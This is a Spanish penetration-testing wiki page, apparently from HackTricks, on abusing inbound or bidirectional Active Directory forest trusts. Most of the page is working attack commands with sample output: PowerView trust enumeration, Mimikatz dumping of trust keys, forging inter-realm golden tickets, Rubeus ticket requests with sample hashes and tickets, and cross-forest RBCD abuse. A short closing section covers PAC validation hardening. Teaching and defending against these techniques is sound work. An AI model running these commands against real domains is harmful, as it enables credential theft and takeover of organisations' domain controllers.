# Dominio de bosque externo - OneWay (Entrante) o bidireccional

{{#include ../../banners/hacktricks-training.md}}

En este escenario, un dominio externo confía en ti (o ambos confían entre sí), por lo que puedes obtener algún tipo de acceso sobre él.

## Enumeración

En primer lugar, necesitas **enumerar** la **confianza**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` te permiten comprobar rápidamente si es probable que las rutas de abuso cross-forest (RBCD, SIDHistory) funcionen sin requisitos adicionales.<sup>[[2]](#references)</sup>

En la enumeración anterior se descubrió que el usuario **`crossuser`** pertenece al grupo **`External Admins`**, que tiene **Admin access** dentro del **DC del dominio externo**.

## Acceso inicial

Si **no pudieras** encontrar ningún acceso **especial** de tu usuario en el otro dominio, aún puedes volver a la AD Methodology e intentar hacer **privesc desde un usuario sin privilegios** (por ejemplo, cosas como kerberoasting):

Puedes usar **funciones de Powerview** para **enumerar** el **otro dominio** utilizando el parámetro `-Domain`, como en:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Suplantación

### Inicio de sesión

Usando un método normal con las credenciales de los usuarios que tienen acceso al dominio externo, deberías poder acceder a:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuso de SID History

También podrías abusar de [**SID History**](sid-history-injection.md) a través de una confianza entre bosques.

Si un usuario se migra **de un bosque a otro** y **SID Filtering no está habilitado**, es posible **añadir un SID del otro bosque**, y este **SID** se **añadirá al token del usuario** al autenticarse **a través de la confianza**.

> [!WARNING]
> Como recordatorio, puedes obtener la clave de firma con
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Podrías **firmar con** la clave **trusted** un **TGT que suplante** al usuario del dominio actual.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Forma completa de suplantar al usuario
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### RBCD entre bosques cuando controlas una cuenta de máquina en el bosque de confianza (sin SID filtering / selective auth)

Si tu foreign principal (FSP) te incluye en un grupo que puede escribir objetos de equipo en el bosque de confianza (por ejemplo, `Account Operators` o un grupo de provisioning personalizado), puedes configurar **Resource-Based Constrained Delegation** en un host objetivo de ese bosque e impersonar a cualquier usuario allí:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Esto solo funciona cuando **SelectiveAuthentication está deshabilitado** y **SID filtering** no elimina tu SID de control. Es una vía lateral rápida que evita la falsificación de SIDHistory y que a menudo se pasa por alto en las revisiones de trusts.<sup>[[2]](#references)</sup>

### Refuerzo de la validación de PAC

Las actualizaciones de validación de firmas PAC para **CVE-2024-26248**/**CVE-2024-29056** añaden la exigencia de firma en los tickets entre forests. En el **Compatibility mode**, las rutas falsificadas de PAC inter-realm, SIDHistory y S4U aún pueden funcionar en DCs sin parchear. En el **Enforcement mode**, los datos PAC sin firma o manipulados que atraviesen un forest trust se rechazan, a menos que también tengas la trust key del forest de destino. Los overrides del registro (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) pueden debilitar esto mientras sigan disponibles.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Cambios en la validación de PAC para CVE-2024-26248 y CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Especificación MS-PAC – Detalles sobre SID filtering y la transformación de claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
